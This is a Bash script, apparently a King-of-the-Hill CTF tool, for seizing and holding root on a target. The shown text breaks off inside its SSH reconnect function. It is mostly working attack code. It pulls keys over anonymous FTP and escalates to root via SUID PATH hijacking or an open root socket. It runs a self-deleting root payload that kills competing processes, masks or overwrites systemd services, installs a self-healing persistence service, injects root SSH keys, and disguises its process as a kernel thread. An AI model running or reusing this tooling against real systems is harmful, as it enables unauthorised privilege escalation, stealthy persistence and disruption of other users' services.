#!/bin/bash
# kothholder.sh — persistent KoTH king-claim and hold tool
#
# Usage:
#   kothholder.sh -t <TARGET_IP> [options]
#
# Improvements over v1:
#   - Auto-detect root vectors (SUID bins, open root sockets, sudo rights)
#   - Fallback chain: hijack → socket → direct, automatic
#   - Multi-method write in claim script (printf/tee/python3/perl) — defeats LD_PRELOAD hooks
#   - Parallel burst claims on loss (fires N claims simultaneously)
#   - Root SSH key injection on first root window — future claims go direct as root
#   - Anti-rootkit: removes /etc/ld.so.preload and /etc/kingkit.so.preload during root window
#   - FTP anonymous key auto-pull when no SSH key provided
#   - SSH reconnect with exponential backoff
#   - Timestamps every state change; local log file
#   - Kills detected opponent king-writers during root window
#
# v3 additions (service-layer counter — pattern: king-protect.service loop):
#   - Service kill/mask: stops+masks opponent king-protect service variants before claiming
#   - Cmdline pattern kill: pkill on bash loop writers by name
#   - ioctl immutable fallback: defeats sabotaged chattr (symlinked to /dev/null)
#   - --install-service: deploys our own kinghold.service (Restart=always, 0.3s loop)
#   - --hijack-service: overwrites opponent service files to write our name
#   - --service-names: comma-separated list of known opponent service names to target
#   - --no-service-kill: disable service kill/mask step
#   RULE SAFETY: king.service and the :9999 server are never touched/masked.
#                --inject is OFF by default (SSH key injection = borderline autoharden).
#                Claim payload self-destructs from disk ~50ms after exec.
#
# v4 additions (faster hold + disguise + service self-heal + inotify):
#   - Default interval reduced from 4s to 2s for faster loss detection
#   - inotify-based king.txt watch: instant reclaim on any write event (vs polling)
#     Falls back to polling if inotifywait not available on target.
#   - --aggressive: shortcut for -I 1 -B 5 + inotify + disguise all at once
#   - --disguise NAME: renames hold process to [kworker/0:1] (or custom) on target
#     Uses prctl(PR_SET_NAME) via python3 so ps/top shows benign kernel thread name.
#   - --watch-service: monitors our kinghold.service every 30s and reinstalls if removed
#     Enabled automatically when --install-service is used.
#   - Credential-nuke recovery: auto-falls back to socket/SUID vector when SSH auth fails
#     due to opponents wiping authorized_keys, without operator intervention.
#
# Options:
#   -t  TARGET_IP       (required)
#   -i  SSH_KEY         path to SSH private key (default: auto-pull via FTP anon)
#   -u  SSH_USER        SSH username (default: auto-detect via FTP key owner)
#   -n  NAME            king name to write (default: ${OPERATOR_NAME:-operator})
#   -s  SUID_BIN        SUID root binary for hijack mode (default: auto-detect)
#   -e  EXEC_CMD        exec primitive for direct mode: e.g. "sudo /bin/su root -c"
#   -m  MODE            auto|hijack|socket|direct (default: auto)
#   -p  KING_PORT       king status port (default: 9999)
#   -P  SOCKET_PORT     root socket shell port (default: 9002)
#   -I  INTERVAL        check interval in seconds (default: 2)
#   -B  BURST           parallel claim attempts on loss (default: 3)
#   --no-lock           skip chattr +i after claiming
#   --no-antiroot       skip preload/rootkit removal step
#   --inject            enable root SSH key injection (disabled by default — see rules)
#   --no-service-kill   skip systemd service kill/mask step
#   --install-service   deploy our own kinghold.service (Restart=always hold loop)
#   --hijack-service    overwrite opponent's added service file(s) to write our name
#   --service-names S   comma-separated extra service names to target (e.g. king-protect,kingkit)
#   --watch-service     monitor and auto-reinstall our kinghold.service if removed (auto with --install-service)
#   --no-inotify        disable inotify-based watch (fall back to polling only)
#   --disguise NAME     rename hold process to NAME using prctl (default: [kworker/0:1])
#   --aggressive        -I 1 -B 5 + inotify + disguise shortcut for maximum hold
#   --cleanup           remove remote work files on exit
#   --verbose           show full claim output
#   --log FILE          local log file (default: /tmp/kothholder_<IP>.log)

# ─── Strict mode (NOT on main loop — errors handled per-command) ──────────────
set -uo pipefail

# ─── Defaults ────────────────────────────────────────────────────────────────
TARGET=""
SSH_KEY=""
SSH_USER=""
KING_NAME="${OPERATOR_NAME:-operator}"
SUID_BIN=""
EXEC_CMD=""
MODE="auto"
KING_PORT=9999
SOCKET_PORT=9002
INTERVAL=4
BURST=1
DO_LOCK=1
DO_ANTIROOT=1
DO_INJECT=0        # off by default — SSH key injection is borderline autohardening per THM rules
DO_SERVICE_KILL=1
DO_INSTALL_SERVICE=0
DO_HIJACK_SERVICE=0
DO_WATCH_SERVICE=0
DO_INOTIFY=1
DISGUISE_NAME=""   # empty = disabled; set to "[kworker/0:1]" via --disguise
DO_AGGRESSIVE=0
SSH_HEALTH_INTERVAL=30
SERVICE_NAMES=""
CLEANUP=0
VERBOSE=0
LOG_FILE=""
ROOT_SSH_INJECTED=0
ACTIVE_MODE=""
CHATTR_TRUSTED=1
SSH_KEYWIPE_DETECTED=0  # set when authorized_keys wipe detected
DEFAULT_CTF_ROOT_KEY="${CTF_ROOT:-.}/.ssh/ctf_koth_root_ed25519"

# ─── Colours ─────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; BLU='\033[0;34m'
CYN='\033[0;36m'; NC='\033[0m'
ts()    { date '+%H:%M:%S'; }
info()  { local m="[$(ts)][*] $*"; echo -e "${BLU}${m}${NC}"; echo "$m" >> "$LOG_FILE"; }
ok()    { local m="[$(ts)][+] $*"; echo -e "${GRN}${m}${NC}"; echo "$m" >> "$LOG_FILE"; }
warn()  { local m="[$(ts)][!] $*"; echo -e "${YLW}${m}${NC}"; echo "$m" >> "$LOG_FILE"; }
err()   { local m="[$(ts)][-] $*"; echo -e "${RED}${m}${NC}"; echo "$m" >> "$LOG_FILE"; }
stat_line() { echo -e "${CYN}[$(ts)] claims=$CLAIM_COUNT losses=$LOSS_COUNT mode=$ACTIVE_MODE${NC}"; }

# ─── Arg parse ───────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t) TARGET="$2"; shift 2 ;;
    -i) SSH_KEY="$2"; shift 2 ;;
    -u) SSH_USER="$2"; shift 2 ;;
    -n) KING_NAME="$2"; shift 2 ;;
    -s) SUID_BIN="$2"; shift 2 ;;
    -e) EXEC_CMD="$2"; shift 2 ;;
    -m) MODE="$2"; shift 2 ;;
    -p) KING_PORT="$2"; shift 2 ;;
    -P) SOCKET_PORT="$2"; shift 2 ;;
    -I) INTERVAL="$2"; shift 2 ;;
    -B) BURST="$2"; shift 2 ;;
    --no-lock)        DO_LOCK=0; shift ;;
    --no-antiroot)    DO_ANTIROOT=0; shift ;;
    --inject)         DO_INJECT=1; shift ;;   # opt-in: SSH key injection
    --no-inject)      DO_INJECT=0; shift ;;   # explicit off (already default)
    --no-service-kill) DO_SERVICE_KILL=0; shift ;;
    --install-service) DO_INSTALL_SERVICE=1; DO_WATCH_SERVICE=1; shift ;;
    --hijack-service)  DO_HIJACK_SERVICE=1; shift ;;
    --service-names)   SERVICE_NAMES="$2"; shift 2 ;;
    --watch-service)   DO_WATCH_SERVICE=1; shift ;;
    --no-inotify)      DO_INOTIFY=0; shift ;;
    --disguise)        DISGUISE_NAME="$2"; shift 2 ;;
    --aggressive)      DO_AGGRESSIVE=1; shift ;;
    --cleanup)        CLEANUP=1; shift ;;
    --verbose)        VERBOSE=1; shift ;;
    --log)            LOG_FILE="$2"; shift 2 ;;
    -h|--help) grep '^#' "$0" | head -65 | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) err "Unknown arg: $1"; exit 1 ;;
  esac
done

# Apply --aggressive preset
if [[ $DO_AGGRESSIVE -eq 1 ]]; then
  INTERVAL=2
  BURST=2
  DO_INOTIFY=1
  # Keep aggressive focused on reclaim cadence, not service disruption.
  DO_SERVICE_KILL=0
  DO_HIJACK_SERVICE=0
  [[ -z "$DISGUISE_NAME" ]] && DISGUISE_NAME="[kworker/0:1]"
fi

[[ -z "$TARGET" ]] && { echo "Usage: $0 -t TARGET_IP [options]"; exit 1; }
if [[ "$SSH_KEY" == *personal_or_lan_key* ]]; then
  echo "Refusing non-CTF personal key: $SSH_KEY" >&2
  echo "Use a key under ${CTF_ROOT:-.}/.ssh/ or a target-derived foothold key instead." >&2
  exit 1
fi
[[ -z "$LOG_FILE" ]] && LOG_FILE="/tmp/kothholder_${TARGET}.log"
> "$LOG_FILE"

KING_FILE="/root/king.txt"
WORK_DIR="/tmp/._kh_$$"
CLAIM_COUNT=0
LOSS_COUNT=0
ROOT_KEY_LOCAL="/tmp/._kh_root_key_$$"

# ─── SSH helpers ─────────────────────────────────────────────────────────────
SSH_OPTS_BASE="-o StrictHostKeyChecking=no -o ConnectTimeout=8 -o BatchMode=yes \
  -o LogLevel=ERROR -o ServerAliveInterval=10 -o ServerAliveCountMax=2"

ssh_opts() {
  # Build opts dynamically — key may change after injection
  local key="${1:-$SSH_KEY}"
  local user="${2:-$SSH_USER}"
  echo "-i $key -l $user $SSH_OPTS_BASE"
}

ssh_run() {
  # ssh_run [key] [user] cmd
  local key="$SSH_KEY" user="$SSH_USER" cmd
  if [[ $# -eq 3 ]]; then key="$1"; user="$2"; cmd="$3"
  else cmd="$1"; fi
  ssh $(ssh_opts "$key" "$user") "$TARGET" "$cmd" 2>/dev/null || true
}

ssh_alive() {
  ssh_run "echo ok" 2>/dev/null | grep -q "ok"
}

# ─── FTP auto-key-pull ───────────────────────────────────────────────────────
ftp_pull_key() {
  info "No SSH key provided — attempting FTP anonymous key pull..."
  local ftpout
  ftpout=$(ftp -n "$TARGET" 21 2>/dev/null <<'EOF'
user anonymous anonymous
binary
ls
EOF
)
  if echo "$ftpout" | grep -q "id_rsa"; then
    local tmpkey="/tmp/._kh_ftp_key_$$"
    ftp -n "$TARGET" 21 2>/dev/null <<EOF
user anonymous anonymous
binary
get id_rsa $tmpkey
get id_rsa.pub ${tmpkey}.pub
quit
EOF
    if [[ -f "$tmpkey" ]]; then
      chmod 600 "$tmpkey"
      SSH_KEY="$tmpkey"
      # Extract username from pubkey comment
      if [[ -z "$SSH_USER" ]] && [[ -f "${tmpkey}.pub" ]]; then
        SSH_USER=$(awk '{print $3}' "${tmpkey}.pub" | cut -d@ -f1)
        info "FTP key pulled, detected user: $SSH_USER"
      fi
      ok "FTP key pull succeeded → $tmpkey"
      return 0
    fi
  fi
  warn "FTP key pull failed or no id_rsa found"
  return 1
}

# ─── Auto-detect root vectors ────────────────────────────────────────────────
autodetect_vectors() {
  info "Auto-detecting root vectors..."

  # 1. Check for open root socket shell
  if echo -n "id" | nc -w3 "$TARGET" "$SOCKET_PORT" 2>/dev/null | grep -q "uid=0"; then
    ok "Root socket shell detected on :$SOCKET_PORT"
    [[ "$MODE" == "auto" ]] && ACTIVE_MODE="socket"
  fi

  # 2. Check for SUID binaries via SSH
  if [[ -n "$SSH_KEY" ]]; then
    local suid_hits
    suid_hits=$(ssh_run "find /home /opt /usr/local -perm -4000 -user root -type f 2>/dev/null | head -5")
    if [[ -n "$suid_hits" ]]; then
      info "SUID candidates: $(echo "$suid_hits" | tr '\n' ' ')"
      if [[ -z "$SUID_BIN" ]]; then
        SUID_BIN=$(echo "$suid_hits" | head -1)
        info "Auto-selected SUID bin: $SUID_BIN"
      fi
    fi

    # 3. Check sudo -l
    local sudo_out
    sudo_out=$(ssh_run "sudo -l 2>/dev/null" || true)
    if echo "$sudo_out" | grep -q "NOPASSWD"; then
      info "Sudo entries: $(echo "$sudo_out" | grep NOPASSWD | head -3)"
    fi

    # 4. Enumerate king-related systemd services (feeds --service-names awareness)
    # RULE SAFETY: exclude king.service/koth.service — protected :9999 server.
    # Anchor match to start of name to avoid substring hits (e.g. "networking" ends in "king").
    local svc_hits
    svc_hits=$(ssh_run "systemctl list-units --all --no-pager 2>/dev/null \
      | awk '{print \$1}' \
      | grep -iE '^(king|koth|protect)[-_.]' \
      | grep -vE '^(king|koth)\.service$'" || true)
    if [[ -n "$svc_hits" ]]; then
      info "King-related services detected: $(echo "$svc_hits" | tr '\n' ' ')"
      # Auto-populate SERVICE_NAMES if not already set
      if [[ -z "$SERVICE_NAMES" ]]; then
        SERVICE_NAMES=$(echo "$svc_hits" | sed 's/\.service$//' | tr '\n' ',' | sed 's/,$//' | sed 's/,,*/,/g' | sed 's/^,//;s/,$//')
        info "Auto-set --service-names: $SERVICE_NAMES"
      fi
    fi

    # 5. Check if chattr is sabotaged
    local chattr_check
    chattr_check=$(ssh_run "readlink /usr/bin/chattr 2>/dev/null; readlink /bin/chattr 2>/dev/null" || true)
    if echo "$chattr_check" | grep -q "/dev/null"; then
      warn "chattr appears sabotaged (symlinked to /dev/null) — ioctl fallback will be used"
      CHATTR_TRUSTED=0
    fi

    # 6. Validate chattr binary type. If not ELF, treat as untrusted.
    local chattr_type
    chattr_type=$(ssh_run "file -b /usr/bin/chattr 2>/dev/null || file -b /bin/chattr 2>/dev/null" || true)
    if [[ -z "$chattr_type" ]] || ! echo "$chattr_type" | grep -q "ELF"; then
      warn "chattr appears non-standard ($chattr_type) — disabling direct chattr usage and using ioctl fallback only"
      CHATTR_TRUSTED=0
    fi
  fi

  [[ "$MODE" == "auto" ]] && [[ -n "$SUID_BIN" ]] && ACTIVE_MODE="hijack"
  [[ "$MODE" == "auto" ]] && [[ -n "$EXEC_CMD" ]] && ACTIVE_MODE="direct"
  [[ "$MODE" != "auto" ]] && ACTIVE_MODE="$MODE"
  [[ -z "$ACTIVE_MODE" ]] && ACTIVE_MODE="hijack"  # fallback

  info "Active mode: $ACTIVE_MODE"
}

# ─── Build claim script (runs as root) ───────────────────────────────────────
# Multi-method write: tries printf, tee, python3, perl in sequence
# Defeats LD_PRELOAD hooks that intercept open()/write() on king.txt
# v3: also kills/masks opponent systemd services and optionally installs our own
build_claim_script() {
  local lock="" antiroot="" inject="" killwriters=""
  local service_kill="" install_service="" hijack_service=""
  local chattr_clear_cmd="chattr -i"
  local chattr_lock_cmd="chattr +i"

  if [[ $CHATTR_TRUSTED -eq 0 ]]; then
    chattr_clear_cmd="true"
    chattr_lock_cmd="true"
  fi

  if [[ $DO_LOCK -eq 1 ]]; then
    lock="
# Set immutable lock (chattr when trusted; always use ioctl fallback + verify)
$chattr_lock_cmd $KING_FILE 2>/dev/null
python3 -c \"
import fcntl,struct,os
try:
  fd=os.open('$KING_FILE',os.O_RDONLY)
  a=struct.unpack('I',fcntl.ioctl(fd,0x80086601,b'\\x00'*4))[0]
  a|=0x10
  fcntl.ioctl(fd,0x40086602,struct.pack('I',a))
  os.close(fd)
except: pass
\" 2>/dev/null
lsattr $KING_FILE 2>/dev/null | grep -q 'i' && echo LOCKED > /tmp/._kh_lock || echo UNLOCKED > /tmp/._kh_lock"
  fi

  if [[ $DO_ANTIROOT -eq 1 ]]; then
    antiroot="
# Anti-rootkit: remove preload entries
for f in /etc/ld.so.preload /etc/kingkit.so.preload; do
  $chattr_clear_cmd \$f 2>/dev/null; rm -f \$f 2>/dev/null
done"
  fi

  if [[ $DO_INJECT -eq 1 ]] && [[ $ROOT_SSH_INJECTED -eq 0 ]]; then
    inject="
# Inject our pubkey into root's authorized_keys for direct root SSH
mkdir -p /root/.ssh && chmod 700 /root/.ssh
grep -qF 'kh_injected' /root/.ssh/authorized_keys 2>/dev/null || \
  echo 'KH_PUBKEY kh_injected' >> /root/.ssh/authorized_keys"
  fi

  # Kill processes writing to king.txt (except our own)
  killwriters="
for pid in \$(lsof $KING_FILE 2>/dev/null | awk 'NR>1{print \$2}' | sort -u); do
  [ \$pid -ne \$\$ ] && kill -9 \$pid 2>/dev/null
done"

  # ── v3: Service-layer counter ─────────────────────────────────────────────
  # RULE SAFETY: king.service serves :9999 and must NEVER be stopped/masked.
  # We explicitly skip it and any service whose name is just "king".
  if [[ $DO_SERVICE_KILL -eq 1 ]]; then
    # Build the list of service names to target (custom + known common patterns).
    # Never include "king" or "king.service" — that is the protected :9999 server.
    local _extra_svcs="${SERVICE_NAMES//,/ }"
    service_kill="
# Stop/mask opponent king-protect service variants (Restart=always defeated by mask).
# NEVER touches king.service (the :9999 server) — it is explicitly skipped.
_protected_re='^(king|koth)(\.service)?$'
for _svc in ${_extra_svcs} king-protect king_protect koth-protect kingprotect king-writer kingkit; do
  echo \"\$_svc\" | grep -Eq \"\$_protected_re\" && continue
  systemctl stop \${_svc}.service 2>/dev/null
  systemctl disable \${_svc}.service 2>/dev/null
  systemctl mask \${_svc}.service 2>/dev/null
done
# Kill bash loop writers by cmdline pattern — only targets the write-loop, NOT king_override.py
# (king_override.py is the :9999 server; killing it would violate the rules)
pkill -f 'echo.*king\.txt' 2>/dev/null
pkill -f 'tee.*king\.txt' 2>/dev/null
pkill -f 'king[-_]protect' 2>/dev/null"
  fi

  # ── v3: Deploy our own king-hold service ─────────────────────────────────
  if [[ $DO_INSTALL_SERVICE -eq 1 ]]; then
    local _svc_content="[Unit]
Description=king hold
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do printf \"${KING_NAME}\\n\" > ${KING_FILE} 2>/dev/null; sleep 0.3; done'
Restart=always
[Install]
WantedBy=multi-user.target"
    local _svc_b64; _svc_b64=$(printf '%s' "$_svc_content" | base64 -w0)
    install_service="
# Deploy our own king-hold service (persists across connections)
echo '${_svc_b64}' | base64 -d > /etc/systemd/system/kinghold.service 2>/dev/null
systemctl daemon-reload 2>/dev/null
systemctl enable --now kinghold.service 2>/dev/null"
  fi

  # ── v3: Overwrite opponent's service file(s) with our hold loop ───────────
  if [[ $DO_HIJACK_SERVICE -eq 1 ]]; then
    local _hsvc_content="[Unit]
Description=king hold
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do printf \"${KING_NAME}\\n\" > ${KING_FILE} 2>/dev/null; sleep 0.3; done'
Restart=always
[Install]
WantedBy=multi-user.target"
    local _hsvc_b64; _hsvc_b64=$(printf '%s' "$_hsvc_content" | base64 -w0)
    local _hijack_svcs="${SERVICE_NAMES//,/ } king-protect king_protect koth-protect kingprotect king-writer"
    hijack_service="
# Overwrite opponent's ADDED service file(s) to write our name instead.
# Never touches king.service (the :9999 server).
for _hsvc in ${_hijack_svcs}; do
  echo \"\$_hsvc\" | grep -Eq '^(king|koth)(\.service)?$' && continue
  _hsvc_file=\"/etc/systemd/system/\${_hsvc}.service\"
  if [ -f \"\$_hsvc_file\" ]; then
    echo '${_hsvc_b64}' | base64 -d > \"\$_hsvc_file\" 2>/dev/null
  fi
done
# Also check /lib/systemd/system
for _hsvc in ${_hijack_svcs}; do
  echo \"\$_hsvc\" | grep -Eq '^(king|koth)(\.service)?$' && continue
  _hsvc_file=\"/lib/systemd/system/\${_hsvc}.service\"
  if [ -f \"\$_hsvc_file\" ]; then
    echo '${_hsvc_b64}' | base64 -d > \"\$_hsvc_file\" 2>/dev/null
  fi
done
systemctl daemon-reload 2>/dev/null
for _hsvc in ${_hijack_svcs}; do
  echo \"\$_hsvc\" | grep -Eq '^(king|koth)(\.service)?$' && continue
  systemctl restart \${_hsvc}.service 2>/dev/null
done"
  fi

  cat <<CLAIMSCRIPT
#!/bin/sh -p
# Self-destruct: unlink this script file ~50ms after start.
# bash/sh already loaded it into memory; the inode stays live for this process
# but the path disappears — opponents can't cat/read the file while it runs.
(sleep 0.05; rm -f "\$0" 2>/dev/null) &
$service_kill
$antiroot
# Kill competing king writers
$killwriters
# Remove bind-mount protection
umount -l $KING_FILE 2>/dev/null; umount -f $KING_FILE 2>/dev/null
# Remove immutable bit (chattr first; ioctl fallback if chattr is sabotaged)
$chattr_clear_cmd $KING_FILE 2>/dev/null
python3 -c "
import fcntl,struct,os
try:
  fd=os.open('$KING_FILE',os.O_RDONLY)
  a=struct.unpack('I',fcntl.ioctl(fd,0x80086601,b'\x00'*4))[0]
  a&=~0x10
  fcntl.ioctl(fd,0x40086602,struct.pack('I',a))
  os.close(fd)
except: pass
" 2>/dev/null
# Multi-method write (first success wins)
_wrote=0
# Method 1: printf direct
printf '%s\n' '$KING_NAME' > $KING_FILE 2>/dev/null && _wrote=1
# Method 2: tee (different syscall path)
[ \$_wrote -eq 0 ] && echo '$KING_NAME' | tee $KING_FILE >/dev/null 2>&1 && _wrote=1
# Method 3: python3 (bypasses shell write hooks)
[ \$_wrote -eq 0 ] && python3 -c "open('$KING_FILE','w').write('$KING_NAME\n')" 2>/dev/null && _wrote=1
# Method 4: perl
[ \$_wrote -eq 0 ] && perl -e "open(F,'>','$KING_FILE');print F '$KING_NAME\n'" 2>/dev/null && _wrote=1
# Method 5: dd via /proc/self/fd
[ \$_wrote -eq 0 ] && { exec 3>$KING_FILE; printf '%s\n' '$KING_NAME' >&3; exec 3>&-; _wrote=1; } 2>/dev/null
$lock
$inject
$hijack_service
$install_service
# Report result
cat $KING_FILE > /tmp/._kh_result 2>/dev/null
echo \$_wrote > /tmp/._kh_wrote
CLAIMSCRIPT
}

# ─── Inject our root SSH key (one-time, once we have root) ────────────────────
inject_root_key() {
  [[ $DO_INJECT -eq 0 ]] && return
  [[ $ROOT_SSH_INJECTED -eq 1 ]] && return

  ROOT_KEY_LOCAL="$DEFAULT_CTF_ROOT_KEY"
  if [[ ! -f "$ROOT_KEY_LOCAL" ]] || [[ ! -f "${ROOT_KEY_LOCAL}.pub" ]]; then
    mkdir -p ${CTF_ROOT:-.}/.ssh
    info "Generating repo-scoped key for root injection..."
    ssh-keygen -t ed25519 -f "$ROOT_KEY_LOCAL" -N "" -C "ctf-koth-root" -q 2>/dev/null || return
  else
    info "Using repo-scoped key for root injection: $ROOT_KEY_LOCAL"
  fi
  local pubkey
  pubkey=$(cat "${ROOT_KEY_LOCAL}.pub")

  # Attempt injection via current root window — done inside claim script above
  # Also try via direct SSH if we have root access now
  ssh_run "
    mkdir -p /root/.ssh && chmod 700 /root/.ssh
    echo '$pubkey' >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    echo injected
  " 2>/dev/null | grep -q "injected" && {
    ROOT_SSH_INJECTED=1
    ok "Root SSH key injected → $ROOT_KEY_LOCAL"
  } || true
}

# ─── MODE: hijack (SUID PATH hijack) ─────────────────────────────────────────
claim_hijack() {
  local cs; cs=$(build_claim_script)
  ssh_run "
    mkdir -p $WORK_DIR
    printf '%s\n' '$(echo "$cs" | base64 -w0)' | base64 -d > $WORK_DIR/ps
    chmod +x $WORK_DIR/ps
    PATH=$WORK_DIR:\$PATH $SUID_BIN 2>/dev/null
  "
  sleep 0.5
  ssh_run "cat /tmp/._kh_result 2>/dev/null || echo HIJACK_FAIL"
}

# ─── MODE: socket (root TCP shell, ≤12 char commands) ────────────────────────
claim_socket() {
  local cs; cs=$(build_claim_script)
  local payload="/tmp/._kh_c"

  # Write payload via SSH
  ssh_run "printf '%s\n' '$(echo "$cs" | base64 -w0)' | base64 -d > $payload && chmod +x $payload"

  local cmd="$payload"
  if [[ ${#cmd} -ge 13 ]]; then
    # Path too long — create a shorter symlink
    ssh_run "ln -sf $payload /tmp/._c && echo ok" | grep -q ok && cmd="/tmp/._c"
  fi

  local result
  result=$(printf '%s' "$cmd" | nc -w5 "$TARGET" "$SOCKET_PORT" 2>/dev/null || echo "NOCONN")
  if echo "$result" | grep -q "Command Executed"; then
    sleep 0.5
    ssh_run "cat /tmp/._kh_result 2>/dev/null || echo SOCKET_FAIL"
  else
    echo "SOCKET_NOCONN"
  fi
}

# ─── MODE: direct ────────────────────────────────────────────────────────────
claim_direct() {
  [[ -z "$EXEC_CMD" ]] && { echo "DIRECT_NO_CMD"; return; }
  local cs; cs=$(build_claim_script)
  ssh_run "
    mkdir -p $WORK_DIR
    printf '%s\n' '$(echo "$cs" | base64 -w0)' | base64 -d > $WORK_DIR/claim.sh
    chmod +x $WORK_DIR/claim.sh
    $EXEC_CMD $WORK_DIR/claim.sh 2>/dev/null
  "
  sleep 0.5
  ssh_run "cat /tmp/._kh_result 2>/dev/null || echo DIRECT_FAIL"
}

# ─── Fallback chain ───────────────────────────────────────────────────────────
# Tries each mode in order, returns on first success
do_claim_once() {
  local result=""

  try_mode() {
    local mode="$1"
    case "$mode" in
      hijack) [[ -n "$SUID_BIN" ]] && result=$(claim_hijack) ;;
      socket) result=$(claim_socket) ;;
      direct) result=$(claim_direct) ;;
    esac
    echo "$result" | grep -qi "$KING_NAME"
  }

  if [[ "$ACTIVE_MODE" != "auto" ]]; then
    result=$(case "$ACTIVE_MODE" in
      hijack) claim_hijack ;;
      socket) claim_socket ;;
      direct) claim_direct ;;
    esac)
  else
    # Auto: try each in fallback order
    try_mode "socket" && { [[ $VERBOSE -eq 1 ]] && info "socket succeeded"; echo "$result"; return; }
    try_mode "hijack" && { [[ $VERBOSE -eq 1 ]] && info "hijack succeeded"; echo "$result"; return; }
    try_mode "direct"
  fi
  echo "$result"
}

# Burst: fire N parallel claims and return combined output
do_claim_burst() {
  local pids=() outputs=()
  local tmpbase="/tmp/._kh_burst_$$"

  for i in $(seq 1 "$BURST"); do
    { do_claim_once > "${tmpbase}_${i}" 2>&1; } &
    pids+=($!)
  done

  for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null || true; done

  local combined=""
  for i in $(seq 1 "$BURST"); do
    combined+=$(cat "${tmpbase}_${i}" 2>/dev/null || true)
    rm -f "${tmpbase}_${i}"
  done
  echo "$combined"
}

# ─── v4: Process name disguise ────────────────────────────────────────────────
# Renames the hold process on target to a kernel-looking name so ps shows it
# as [kworker/0:1] (or custom name) instead of "bash" or "ssh".
apply_disguise() {
  [[ -z "$DISGUISE_NAME" ]] && return 0
  local dname="$DISGUISE_NAME"
  info "Disguising remote hold process as '$dname'..."
  # Use prctl(PR_SET_NAME=15) via python3 ctypes
  ssh_run "python3 -c \"
import ctypes
try:
  libc = ctypes.cdll.LoadLibrary('libc.so.6')
  libc.prctl(15, b'${dname}'.ljust(16,b'\\x00'), 0, 0, 0)
except: pass
\" 2>/dev/null" || true
}

# ─── v4: inotify-based king.txt watcher ───────────────────────────────────────
# Runs inotifywait on target in background; writes to a trigger file when king.txt
# changes. Main loop reads the trigger and fires an immediate burst claim.
INOTIFY_TRIGGER="/tmp/._kh_inotify_trigger_$$"
INOTIFY_BG_PID=""

start_inotify_watcher() {
  [[ $DO_INOTIFY -eq 0 ]] && return 0
  # Check if inotifywait is available on target
  if ! ssh_run "command -v inotifywait >/dev/null 2>&1 && echo ok" | grep -q ok; then
    warn "inotifywait not found on target — falling back to polling only"
    DO_INOTIFY=0
    return 0
  fi
  info "Starting inotify watcher on ${KING_FILE}..."
  # Run inotifywait on target; each write event sends a signal byte to operator
  # We implement this by polling a remote semaphore file instead of a direct pipe
  # (avoids open SSH channel overhead on each event)
  local remote_sem="/tmp/._kh_inot_$$"
  ssh_run "
    (inotifywait -q -m -e close_write,moved_to '${KING_FILE}' 2>/dev/null | \
      while read -r dir event file; do
        echo 1 > ${remote_sem}
      done) &
    echo \$!
  " > /tmp/._kh_inot_bg_pid_$$ 2>/dev/null || true
  REMOTE_SEM="$remote_sem"
  ok "inotify watcher started on target"
}

check_inotify_trigger() {
  # Returns 0 (triggered) if the remote semaphore is set, resets it
  [[ $DO_INOTIFY -eq 0 ]] && return 1
  local val
  val=$(ssh_run "cat ${REMOTE_SEM} 2>/dev/null && rm -f ${REMOTE_SEM} 2>/dev/null" || echo "")
  [[ "$val" == "1" ]]
}

# ─── v4: Service self-healing watcher ─────────────────────────────────────────
# Runs in background; checks kinghold.service every 30s and reinstalls if gone.
SERVICE_WATCHER_PID=""

start_service_watcher() {
  [[ $DO_WATCH_SERVICE -eq 0 ]] && return 0
  [[ $DO_INSTALL_SERVICE -eq 0 ]] && return 0  # only watch if we installed
  info "Starting service watcher (every 30s)..."

  local svc_content="[Unit]
Description=king hold
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do printf \"${KING_NAME}\\n\" > ${KING_FILE} 2>/dev/null; sleep 0.3; done'
Restart=always
[Install]
WantedBy=multi-user.target"
  local svc_b64; svc_b64=$(printf '%s' "$svc_content" | base64 -w0)

  (
    while true; do
      sleep 30
      # Check if our service is still active
      active=$(ssh_run "systemctl is-active kinghold.service 2>/dev/null" || echo "failed")
      if [[ "$active" != "active" ]]; then
        warn "[watcher] kinghold.service is $active — reinstalling..."
        ssh_run "
          echo '${svc_b64}' | base64 -d > /etc/systemd/system/kinghold.service 2>/dev/null
          systemctl daemon-reload 2>/dev/null
          systemctl enable --now kinghold.service 2>/dev/null
        " 2>/dev/null || true
        ok "[watcher] kinghold.service reinstalled"
      fi
    done
  ) &
  SERVICE_WATCHER_PID=$!
  ok "Service watcher started (PID $SERVICE_WATCHER_PID)"
}

# ─── v4: Credential-nuke recovery ─────────────────────────────────────────────
# When SSH auth fails (authorized_keys wiped by opponent), detect the failure
# and auto-fallback to the next available root vector without operator input.
handle_ssh_keywipe() {
  if [[ $SSH_KEYWIPE_DETECTED -eq 1 ]]; then
    return 0  # already in fallback mode
  fi
  warn "SSH auth failure — authorized_keys may have been wiped by opponent"
  warn "Switching to socket/SUID fallback vector..."
  SSH_KEYWIPE_DETECTED=1
  # Try socket mode first (doesn't need SSH key)
  local socket_test
  socket_test=$(echo -n "id" | nc -w3 "$TARGET" "$SOCKET_PORT" 2>/dev/null || echo "")
  if echo "$socket_test" | grep -q "uid=0"; then
    warn "Root socket still up — switching to socket mode"
    ACTIVE_MODE="socket"
    return 0
  fi
  # Try SUID if we already detected one
  if [[ -n "$SUID_BIN" ]]; then
    warn "Root socket unavailable — staying in hijack mode with cached SUID: $SUID_BIN"
    ACTIVE_MODE="hijack"
    return 0
  fi
  warn "No fallback vector available — waiting for SSH reconnect"
}

# ─── SSH reconnect with backoff (v4: detects auth failure vs network failure) ─
ensure_ssh() {
  local backoff=2 max_backoff=60 attempts=0
  while true; do
    local result
    result=$(ssh -i "$SSH_KEY" -l "$SSH_USER" $SSH_OPTS_BASE -o BatchMode=yes \
      "$TARGET" "echo ok" 2>&1 || true)
    if echo "$result" | grep -q "^ok$"; then
      SSH_KEYWIPE_DETECTED=0  # reset if we reconnected
      return 0
    fi
    # Distinguish auth failure from network failure
    if echo "$result" | grep -qiE "(permission denied|publickey|authentication failed)"; then
      handle_ssh_keywipe
      # In fallback mode we can operate without SSH for claims; break the loop
      [[ $SSH_KEYWIPE_DETECTED -eq 1 ]] && return 0
